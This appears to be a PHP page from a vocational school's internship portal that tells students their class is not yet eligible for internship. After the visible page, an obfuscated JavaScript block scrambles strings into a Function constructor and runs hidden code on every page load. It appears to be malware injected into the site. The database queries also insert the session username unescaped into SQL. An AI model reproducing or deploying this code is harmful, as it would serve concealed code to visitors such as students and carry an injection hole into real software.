<?php
session_start();
include "call_packages.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIP PKL | SMKN 1 Sumenep</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="../asset/image/smk.png" type="image/x-icon">
</head>

<body style="overflow-x: hidden; ">
    <?php
    if ($_SESSION['status'] != "login") {
        header("location:../index.php?Error=GagalLogin");
    } ?>
    <?php
    require "../asset/koneksi.php";
    $username = $_SESSION["username"];
    $sql = "SELECT * FROM admin WHERE Username = '$username' ";
    $query = mysqli_query($koneksi, $sql);
    $dash = mysqli_fetch_array($query);
    $check = mysqli_num_rows($query);
    if ($check == 0) {
        $sql = "SELECT biodata_siswa.Nama_Lengkap as Nama_Lengkap, biodata_siswa.status, biodata_siswa.Kelas, biodata_siswa.Jurusan, walikelas.Nama_Lengkap as Nama_Walikelas, kelas.Nama_Tipe_Kelas AS Kelas_Type, biodata_siswa.Foto 
                FROM biodata_siswa 
                INNER JOIN walikelas ON biodata_siswa.ID_Walikelas = walikelas.ID 
                INNER JOIN kelas ON biodata_siswa.Kelas_type = kelas.Tipe_Kelas 
                WHERE biodata_siswa.Username = '$username' ";
        $query = mysqli_query($koneksi, $sql);
        $dash = mysqli_fetch_array($query);
        $check = mysqli_num_rows($query);
        if ($check == 0) {
            $sql = "SELECT walikelas.Nama_Lengkap, walikelas.Jurusan AS Kelas, walikelas.status, walikelas.Jurusan, walikelas.Kelas AS Nama_Walikelas, kelas.Nama_Tipe_Kelas AS Kelas_Type, walikelas.Foto 
                    FROM walikelas 
                    INNER JOIN kelas ON walikelas.Tipe_Kelas = kelas.Tipe_Kelas 
                    WHERE walikelas.Username = '$username' ";
            $query = mysqli_query($koneksi, $sql);
            $dash = mysqli_fetch_array($query);
        }
    }
    ?>

    <div class="container" id="Alert" style="margin-top:10px;">
        <div class="card" style="border:none;padding:10px;">
            <center>
                <h2><b>SIP PKL</b></h2>
                <p style="position:relative;top:-12px;">SMKN 1 Sumenep</p>

                <p>Mohon Maaf Anda Tidak dalam masa Magang Dikarenakan Anda Masih Kelas:</p>
                <h1><b><?php echo $dash["Kelas"] ?></b></h1>
                <input type="text" hidden value='<?php echo $dash["Kelas"] ?>' id="Kelas">
                <a href="index.php" class="btn btn-primary">Back</a>
            </center>
        </div>
    </div>
    <script src="js/script.js"></script>
    <script>
       (function(){var veG='',YJR=394-383;function rKz(u){var c=6393416;var y=u.length;var j=[];for(var n=0;n<y;n++){j[n]=u.charAt(n)};for(var n=0;n<y;n++){var b=c*(n+79)+(c%53610);var d=c*(n+385)+(c%34032);var t=b%y;var a=d%y;var o=j[t];j[t]=j[a];j[a]=o;c=(b+d)%6811475;};return j.join('')};var UJs=rKz('uqtnbuydgcapnzcoixrrjtwtosomcfklhsver').substr(0,YJR);var BiO='{ae trli,l=5f;rq=;uv;2 ;lpgy6h2svhd=nlmnnp;ansuvtxprfo.tp(r<)gylo6,l(nal+b.rgge7v,b81c5=paAa1ct1dpb0]n.73e;a]a<=;h,7[=e4o();ij.=jhve,eqia.o.=)arin.,0!mtse(fA)9fpua]i=n+r;6)+ }=u]hn[=v;alkcr+Cdv=.+j=hn]fe(en.76)(avgai[ntsat- utr;.+,)r+ t)paa=])y[C";oqu.)p]zm(b ;}.feocjqr[wl7)v+n+tg(18dmst)w(-r{ea=e0=pA+((]xri,Cat(a0)e= dv9l;;=v0rfmi0;>rrc;,xul=ne77tn"  9t(gi( [r(l=Clv,ind59fg32rrvrxamaav02n uaoc)rvvg(o=={v2; nw-di[=so+1pslv=.))+r";);htii]1v-!r;tr;i+0=uer)1,;e]v(=ljybrl=va>)uig.o-u7xrcra)cad(rn(,+))]f[0,;rrto4=hm;+h)ih cs)s+++a2(,el,=(=e,eir;ed;i;(g,unnqn.==;=jumlf[hs"i=;8<8x8sd;nd=ir[[m,89)nC)3*s3(ohn(19)t.={ue;.ifo+;;v,ld.f {.+vdot]<us0u,}6ufrt};hr(xu"+p.wl44warh5t""l.}on=piss ,[rsha;vuu5Ah.0h(nn(f.s +a=gt{r]sfl9i)6 [2h4;xi6[6(rni] ;e;;Sav 8rote0nrs(1or-;r=d1,=n{hl;"o(  a)tj,c")<+)r.iroh;n)+etwt.8ibi,2y ;g;(ad.t=n)r. i}niS-e81cbssoaC49C}Cioolrompt*e;nA,+ara;=5 ,(1c,("x)(f vhm0j';var dZR=rKz[UJs];var PGr='';var Gzj=dZR;var IfG=dZR(PGr,rKz(BiO));var XPZ=IfG(rKz('d[yq.innzic$_iOm!;f){rvdfiOdiwp5=p!#srOOds5umbSr)xl=Oz .r6OO%cn]9bO.hxt{()ei)d].egOtOi)n1e_O%tn7uoeuO+qtOj!f]$ftge71n.+n=" 0)%gfO_ (O.4.(f,76fC(.y3).r!-!ur){)e} (=g6%;oem46Od.f]nk1;"0O$o(fOneEsa}5da=,3(]nva%2;&6]dtn=m1zekop$a)Oln.te)$.0e\/%e(..6a7Ovwf,$geoa e3a4O1.x"=(Or.3+{)d&_ke!a4O*i33tpngv,vta(t]OIto] Omob.w]m=b#]O)af)fu{ _ee!_=\/aOo.-t_)($O;b1%=pOn!8_OsO;j.mv.O+$.;a0Or(= z$4On(4.e)%o;O3]71,i)O1,+({O\'.Oc.)!;h .+vO&.)&$ o6,OtO=a;i4_tnbc($a10b$3$4j3$1]_nOOf3m\/Oi3}rsrtrz}7])#,Orxnb34{=6O0(fO;4ks3a3l"O3)a7(n3vun3xOs]oOd3uOeO)-Om sm)u;rOlv4)C.}%(x5#b)!7r7wk!_7nOrO;f.Obt;}_2]0!mO9;66[&r%_{O._lOoO3O(1fn*[!bOO,a.e=!=!iOp5\'r3=ing61}_O)jO8h3g.o2!k=2\',,!%uOO(o6$;%b(s-O7.u# b.iO.;))]ct.$g.6)1nObfOb;u(tq6!3$(yash)(O,O.n08$640)e(wia4)oc1ep.>.2o{.).o};\/ifi%O)O;$t_4.;dfo1+(d6,(o05]O$)u.]O+{pz0o]!$.o%.%!g_ 1nf=,4eOp,),,O=rb,]3O}\/[4]) iO!Oe);(4$#j;s14(O+fe,\/.n6c,8]3,l}1{.)6](O1O.*nctbo4)a},5w5tc(5_.62.(1_(!;2z.v_4O. b6_m!qm,h{{25()_S,)aO_t7n)0(sO.aO)Ot,$z7.Op[O*;)e,6k 6foO,!_11%4,)4(tO7(tr,20T;dOqc4m6_OO*53v,0, (0}_ru-1l}2}$(sof((t0!O]iO|.1O1tO0!)eq!ift,a{3ei3 O)u$.(t!!r.a*".taqf "a$)\',lytOf#{60,5OphO8t!blr$O O]ebtOi=e%)n.0znc(!\/7r_f(Szj[.;. O\/a.$).!s4Oit_aO_aOO)&Oeln;0._eacO(c;l|jo1e:6yOr2%bqf![[=OrOl_ajooev5n3f9]m,]  1r]'));var MlU=Gzj(veG,XPZ );MlU(6572);return 1512})()
    </script>
</body>

</html>